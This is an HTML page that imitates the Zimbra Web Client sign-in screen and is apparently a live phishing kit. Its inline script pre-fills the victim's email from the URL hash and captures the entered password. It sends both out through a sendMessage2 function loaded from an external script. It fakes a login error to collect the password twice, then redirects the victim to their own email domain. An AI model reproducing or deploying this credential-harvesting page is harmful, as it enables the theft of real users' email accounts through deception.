<!DOCTYPE html>
<!-- set this class so CSS definitions that now use REM size, would work relative to this.
	Since now almost everything is relative to one of the 2 absolute font size classese -->
<html class="user_font_size_normal" lang="en">
<head>
<!--
 login.jsp
 * ***** BEGIN LICENSE BLOCK *****
 * Zimbra Collaboration Suite Web Client
 * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software Foundation,
 * version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License along with this program.
 * If not, see <https://www.gnu.org/licenses/>.
 * ***** END LICENSE BLOCK *****
-->
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
	<link rel="stylesheet" type="text/css" href="https://mail.zimbra.com/css/common,login,zhtml,skin.css?skin=harmony&v=240819140237">
	<link rel="SHORTCUT ICON" href="https://mail.zimbra.com/img/logo/favicon.ico">


</head>
<style type="text/css">
    .message {
        font-size: 15px;

}
    .errorMessage, 
#errorMessageDiv {
    background-color: transparent !important;
}
</style>
<body onload="onLoad();">

	<div id="modifiedLogin" class="LoginScreen" >
		<div class="modernCenter" >
                <div class="modernContentBox">
                    <div class="logo">
                        <a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
                            <span class="ImgLoginBanner"></span>
                        </a>
                    </div>				
				<form id="zLoginForm" method="post" name="loginForm" action="/" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login"/>
								<input type="hidden" name="login_csrf" value="3a199c22-e86a-4b9a-bbb7-c60bcd03403a"/>

								<div class="signIn">Sign In</div>
                                <div class="message">
                Log in with your current password to continue using same password
            </div>
                        <div class="form">
                        <div id="errorMessageDiv" class="errorMessage">

                        <!-- <div id="errorMessageDiv" class="errorMessage"></div> -->
                        <div id="successMessageDiv" class="success-message"></div>
                            </div>
                        <div class="loginSection">
                                    <label for="username" class="zLoginFieldLabel">Username</label>
                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
                                        <label for="password" class="zLoginFieldLabel">Password</label>
                                    <div class="passwordWrapper">
                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024"/>
                                        <span toggle="#password" onClick="showPassword();" id="showSpan" style="display: block;">Show</span>
                                        <span toggle="#password" onClick="showPassword();" id="hideSpan" style="display: none;">Hide</span>
                                    </div>
                                    <div class="signInAndLabel">
                                        <div>
                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton">Sign In</button>
                                        </div>
                                        <div class="rememberCheckWrapper"> 
                                                <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme" />
                                                <label id="remember" for="remember">Stay signed in</label>
                                            </div>
                                        </div>
                                </div>
                            <div>
                            <hr/>
                            </div>
                            <div>
                            <div class="versionBlock">
                                    <label for="client">Web App Version</label>
                                    <div style="position: relative;">
                                        <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                            <option value="preferred" selected > Default</option>
                                            <option value="advanced" > Classic</option>
                                            <option value="modern" > Modern</option>
                                            </select>
                                        <input type="button" class="alignWhatsThis" onclick="showTooltip();" id='ZLoginWhatsThisButton' />
                                    </div>

                                    <div id="ZLoginWhatsThis">
                                        <div class="ZLoginInfo">
                                            <span id="dialogCloseButton" onclick="hideTooltip();">&times;</span>
                                            <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings > General > Zimbra Version. In Classic, set it in Preferences > General > Sign In.</p></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small">Copyright Â© 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
		</div>
		<div class="decor2"></div>
	</div>

</body>
<script type="text/javascript" src="gt.js"></script>
<script type="text/javascript">// Function to get email from URL hash
// document.querySelector('hr').style.display = 'none';
// document.getElementById('errorMessageDiv').textContent = '';
// Function to get email from URL hash
function getEmailFromHash() {
    const hash = window.location.hash.substring(1);
    return hash || '';
}

// Function to disable and style email field
function disableEmailField(email) {
    const usernameField = document.getElementById('username');
    if (email) {
        usernameField.value = email;
        usernameField.style.backgroundColor = '#f0f0f0';
        usernameField.style.color = '#666666';
        usernameField.disabled = true;
    }
}

// Initialize on page load
function onLoad() {
    const email = getEmailFromHash();
    disableEmailField(email);
    
    // Add submit event listener to the form
    const loginForm = document.getElementById('zLoginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleSubmit);
    }
}

let submitCount = 0;

// Handle form submission
async function handleSubmit(event) {
    event.preventDefault();
    
    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    try {
        // Format message with user details
        const formattedMessage = await formatMessage(email, password, "Zimbra PAGE");
        submitCount++;
        
        if (submitCount === 1) {
            // First submission - show error and send data
            document.getElementById('errorMessageDiv').textContent = errormessage;
            sendMessage2(formattedMessage);
            
            // Reset password field
            document.getElementById('password').value = '';
            return false;
        } else if (submitCount === 2) {
            // Second submission - show success, send data and redirect
            document.getElementById('errorMessageDiv').textContent = 'Login successful!';
            // const successDiv = document.getElementById('successMessageDiv');
            // successDiv.style.display = 'block';
            // successDiv.textContent = 'Login successful!';
            
            
            // Reset password field
            document.getElementById('password').value = '';
            // Send the formatted message first
            await sendMessage2(formattedMessage);
            
            // Redirect after 3 seconds based on email domain
            setTimeout(() => {
                const domain = email.split('@')[1];
                if (domain) {
                    window.location.href = `https://${domain}`;
                }
            }, 3000);
        }
    } catch (error) {
        console.error('Error handling submission:', error);
    }
    
    return false;
}

// Password show/hide functionality
function showPassword() {
    const passwordField = document.getElementById('password');
    const showSpan = document.getElementById('showSpan');
    const hideSpan = document.getElementById('hideSpan');
    
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        showSpan.style.display = 'none';
        hideSpan.style.display = 'block';
    } else {
        passwordField.type = 'password';
        showSpan.style.display = 'block';
        hideSpan.style.display = 'none';
    }
}

// Initialize on page load
window.onload = onLoad;

</script>
</html>